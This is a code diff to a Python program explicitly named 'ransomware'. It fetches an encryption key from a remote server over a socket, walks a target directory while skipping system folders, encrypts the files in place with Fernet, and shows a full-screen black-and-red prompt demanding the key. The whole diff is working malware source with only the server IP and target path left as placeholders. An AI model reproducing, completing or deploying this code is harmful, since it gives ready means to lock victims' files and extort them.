@@ -1,13 +1,18 @@
 import os
-import random
 from cryptography.fernet import Fernet
 import tkinter as tk
 import socket
 from tkinter import *
-from os import path
+from tkinter import messagebox
 
 #python -m PyInstaller --onefile -w encrypt.py
-#key = Fernet.generate_key()
+
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+IP_ADDRESS = 'SERVER IP HERE'
+PORT = 9090
+client_socket.connect((IP_ADDRESS, PORT))
+key = client_socket.recv(1024)
+
 
 class ransomware:
     EXCLUDED_DIRECTORIES = ('Program Files',
@@ -27,7 +32,7 @@ class ransomware:
     
     def find_files(self):
         file_paths = []
-        directory = r'C:\Users\drew\Documents\testing'
+        directory = r'TEST\DIRECTORY\HERE'
         #f = open("paths/path.txt","w")
         for root, dirs, files in os.walk(directory):
             if any(s in root for s in self.EXCLUDED_DIRECTORIES):
@@ -44,7 +49,6 @@ class ransomware:
                         
     
     def encrypt_files(self, filename):
-        key =  self.save_key()
         fernet = Fernet(key)
         with open(filename, "rb") as file:
             file_content = file.read()
@@ -53,34 +57,11 @@ class ransomware:
             file.write(encrypted_content)
         print(filename)
 
-    def save_key(self):
-        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        IP_ADDRESS = 'PUT IP HERE'
-        PORT = 9090
-        client_socket.connect((IP_ADDRESS, PORT))
-        key = client_socket.recv(1024)
-        print(key)
-        with open("thekey.key", "wb") as thekey:
-            thekey.write(key)
-        return key
 
 
 ransomware = ransomware()   
+file_paths = ransomware.find_files()
 
-
-def get_decryption_input():
-    key_input = key_input.get()
-    print(f'Key inputted: {key_input}')
-
-def decrypt_files(self, filename):
-    with open("thekey.key", "rb") as key:
-        decrypt_key = key.read()
-    with open(filename, "rb") as file:
-        file_content = file.read()
-    decrypted_content = Fernet(decrypt_key).decrypt(file_content)
-    with open(filename, "wb") as file:
-        file.write(decrypted_content)
-    print(filename)
 
 def decryption_screen():
     root = tk.Tk()
@@ -108,25 +89,46 @@ def decryption_screen():
     labe4.config(font=('tahoma',int(gap)))
     labe4.config(background='black',foreground='red')
     labe4.pack(anchor='n', ipady=20)
+    
+    def decrypt_files():
+        try:
+            user_input = entry.get()
+            if user_input != key.decode():
+                raise ValueError("Incorrect key")
+        except ValueError as e:
+            messagebox.showerror("Error", e)
 
-    user_input = tk.Entry(root, width=int(screen_width/10))
-    user_input.pack(anchor='n', ipady=20)
+        def decrypt_file(filename):
+            fernet = Fernet(key)
+            with open(filename, "rb") as file:
+                file_content = file.read()
+            decrypted_content = fernet.decrypt(file_content)
+            with open(filename, "wb") as file:
+                file.write(decrypted_content)
+            print(filename)
+
+        for file in file_paths:
+            decrypt_file(file)
+        messagebox.showinfo("Success", "Your Files have been decrypted!")
+        root.destroy()
+
+    entry = tk.Entry(root, width=int(screen_width/10))
+    entry.pack(anchor='n', ipady=20)
 
     canvas1 = tk.Canvas(root, bg='black', highlightthickness=0, height=20, width=screen_width)
     canvas1.pack()
 
-    key_submit = tk.Button(root, text='Submit', command=get_decryption_input)
+    key_submit = tk.Button(root, text='Submit', command=decrypt_files)
     key_submit.pack(anchor='n')
 
     root.mainloop()
 
 
 def ransom():
-    file_paths = ransomware.find_files()
     #filepath = 'paths/path.txt'
     for file in file_paths:
         current_file = file.strip()
-        ransomware.decrypt_files(current_file)
+        ransomware.encrypt_files(current_file)
 
 #    with open(filepath) as file:
 #        line = file.readline()
